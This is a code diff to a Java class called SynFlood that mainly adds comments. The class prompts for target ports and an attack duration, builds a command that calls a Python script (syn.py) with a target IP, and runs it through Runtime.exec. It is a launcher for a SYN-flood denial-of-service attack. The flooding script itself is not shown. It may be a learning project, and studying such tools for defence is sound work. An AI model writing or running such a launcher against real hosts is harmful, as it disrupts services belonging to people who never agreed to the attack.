@@ -1,7 +1,6 @@
 package Base;
 
 import java.io.BufferedReader;
-import java.io.File;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.util.ArrayList;
@@ -11,7 +10,6 @@ import java.util.ArrayList;
  * @version 1.0
  */
 public class SynFlood {
-
 
     static String uri = getURI();
 
@@ -25,26 +23,38 @@ public class SynFlood {
      */
     public static void synAttack(String ip) {
 
+        // Ask user for which ports to attack
         ArrayList<Integer> openPortList = GetData.getPortsToAttack();
+
+        // Handing the selected ports data to setOpenPort method
+        // Then modified the format for matching syn.py argument
         String attackPorts = setOpenPort(openPortList);
 
         System.out.println();
+
+        // Setup the duration of attack
+        // Unit is minute
         System.out.println("How long do you want to attack [ input * min ]?");
         String attackDuration = String.valueOf(GetData.getInteger());
 
         String destinationIp = ip;
 
+        // Build a command for Runtime
         String cmd =  "python " + uri + "/syn.py"
                 + " -t " + destinationIp + " -d " + attackDuration + " " + attackPorts ;
 
         try {
-
             Runtime r = Runtime.getRuntime();
             Process p = r.exec(cmd);
 
+            // As this function is performed by python which doesn't generate output
+            // User will not see any output
+            // This part only functions to trigger Process p
+            // (I will improve this part better if I got time)
             BufferedReader in = new BufferedReader(new
                     InputStreamReader(p.getInputStream()));
             String inputLine;
+
             while ((inputLine = in.readLine()) != null) {
                 System.out.println(inputLine);
             }
@@ -85,7 +95,7 @@ public class SynFlood {
      * @return current uri
      */
     public static String getURI() {
-
+        // Set up the URI of where this program is executed
         String uri = System.getProperty("user.dir");
 
         return uri;
